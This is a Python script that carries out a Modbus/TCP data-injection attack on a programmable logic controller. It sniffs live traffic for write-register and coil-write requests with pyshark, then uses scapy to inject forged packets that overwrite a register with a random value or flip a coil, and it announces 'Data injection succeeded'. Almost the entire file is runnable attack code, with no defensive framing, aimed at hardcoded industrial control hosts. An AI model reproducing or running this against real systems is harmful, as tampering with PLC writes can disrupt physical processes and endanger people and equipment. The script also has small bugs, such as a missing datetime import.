import modbus_tk.modbus_tcp as mt
import modbus_tk.defines as md
from time import *
from scapy.all import *
from random import *
import pyshark

# Modbus ADU
class ModbusTCP(Packet):
    name = "Modbus/TCP"
    x = randrange(100, 1000)
    fields_desc = [ ShortField("Transaction Identifier", x),
                    ShortField("Protocol Identifier", 0),
                    ShortField("Length", 9),
                    XByteField("Unit Identifier", 1),
                    ]

# Modbus PDU
class Modbus(Packet):
    name = "Modbus"
    r = randrange(1, 100)
    c = randrange(1, 3)
    fields_desc = [ XByteField("Function Code", 16),
                    ShortField("Reference Number", c),
                    ShortField("Word Count", 1),
                    XByteField("Byte Count", 2),
                    ShortField("Register Value (UINT16)", r),
                    ]

class Modbus0(Packet):
    name = "Modbus"
    a1 = randrange(10, 18)
    fields_desc = [ XByteField("Function Code", 5),
                    ShortField("Reference Number", a1),
                    ShortField("Data", 0x0000),
                    ]
class Modbus1(Packet):
    name = "Modbus"
    a2 = randrange(10, 18)
    fields_desc = [ XByteField("Function Code", 5),
                    ShortField("Reference Number", a2),
                    ShortField("Data", 0xff00),
                    ]

def changeData_reg():
    s = socket.socket()
    s.connect(("192.168.6.6", 502))   # IP and port
    ss = StreamSocket(s, Raw)
    ss.sr1(Raw(ModbusTCP()/Modbus()))
    time.sleep(0.1)

def changeData0():
    s = socket.socket()
    s.connect(("192.168.6.6", 502))
    ss = StreamSocket(s, Raw)
    ss.sr1(Raw(ModbusTCP()/Modbus0()))

def changeData1():
    s = socket.socket()
    s.connect(("192.168.6.6", 502))
    ss = StreamSocket(s, Raw)
    ss.sr1(Raw(ModbusTCP()/Modbus1()))



xx = 1
while xx:
        plc_frames = pyshark.LiveCapture(interface='usb0', bpf_filter='dst host 10.55.0.6 and dst port 502 and tcp[13] = 0x18')
        plc_frames.sniff(packet_count=1)
        modbus_query = plc_frames[0]
        try:
            func = str(modbus_query.modbus.func_code)
            if func == '16':
                        changeData_reg()
                        xx = 0
                        print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif str(modbus_query.modbus.data) == 'ff:00':
                        changeData0()
                        xx = 0
                        print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
            elif str(modbus_query.modbus.data) == '00:00':
                        changeData1()
                        xx = 0
                        print("\033[1;33m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                        print("\033[1;36m{}\033[0m".format(modbus_query.show()))
        except:
            xx = 1
#end = time.perf_counter()
#print("\033[1;33m=====================Executed time : {}s ======================\033[0m".format(end-start))
exit()
